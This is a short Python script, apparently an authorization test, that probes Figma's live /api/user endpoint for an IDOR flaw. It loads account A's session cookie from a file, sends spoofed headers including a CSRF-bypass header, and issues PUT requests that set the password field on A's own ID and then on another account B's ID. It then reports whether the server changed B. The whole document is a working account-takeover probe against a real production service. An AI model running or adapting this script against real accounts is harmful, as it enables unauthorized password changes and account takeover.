import json, sys, urllib.request, urllib.error, ssl
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
ctx = ssl.create_default_context()

A_ID = '1666382703778278399'
B_ID = '1667396392129259941'

# 用户提供的当前有效 A 会话完整 cookie
CK = open('cookie_browser_a.txt', encoding='utf-8').read().strip()

PP = json.load(open('pp_b.json', encoding='utf-8'))

BASE_H = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'Origin': 'https://www.figma.com',
    'Referer': 'https://www.figma.com/files/team/1666382706663462213/recents-and-sharing?fuid=1666382703778278399',
    'x-csrf-bypass': 'yes',
    'x-figma-client-version': '5848603c50c1ee154ea6a1fe5ee3aab3791c5b48',
    'x-figma-support-request-id': '655a156d-f0c8-4e14-9a56-1842289b5a7b',
    'x-figma-user-id': A_ID,
    'x-figma-user-plan-max': 'starter',
    'tsid': 'E1ACf2Vx7c9jRUCG',
    'Cookie': CK,
}

def put(label, body, headers_extra=None):
    h = dict(BASE_H)
    if headers_extra:
        h.update(headers_extra)
    r = urllib.request.Request('https://www.figma.com/api/user',
                               data=json.dumps(body).encode(), headers=h, method='PUT')
    try:
        resp = urllib.request.urlopen(r, timeout=25, context=ctx)
        raw = json.loads(resp.read())
        m = raw.get('meta', {})
        print(f'[{resp.status}] {label}')
        print(f'    meta.id={m.get("id")}  email={m.get("email")}  job_title={m.get("profile",{}).get("job_title")}')
        print(f'    message={raw.get("message")!r}')
        return m.get('id')
    except urllib.error.HTTPError as e:
        b = e.read().decode('utf-8','replace')
        print(f'[{e.code}] {label}: {b[:300]}')
        return None

print('=== 1. 基线: A会话(完整头) + id=A_ID + 密码密文(同值无损) ===')
who = put('A改自己密码', {'id': A_ID, 'protected_password': PP})
print('→', '按会话(A)' if who == A_ID else ('异常' if who else '失败'))

print()
print('=== 2. 越权判别: A会话 + id=B_ID + 密码密文 ===')
print('两账号密码相同 → 无论改谁都无损。meta.id 揭示服务端按谁处理:')
who = put('A会话 id=B 改密码', {'id': B_ID, 'protected_password': PP})
if who == B_ID:
    print('!!!! IDOR 确认: A 修改了 B 的密码字段 !!!!')
elif who == A_ID:
    print('→ 按会话身份处理, id 字段被忽略 → 安全')
else:
    print('→ 无法判别')
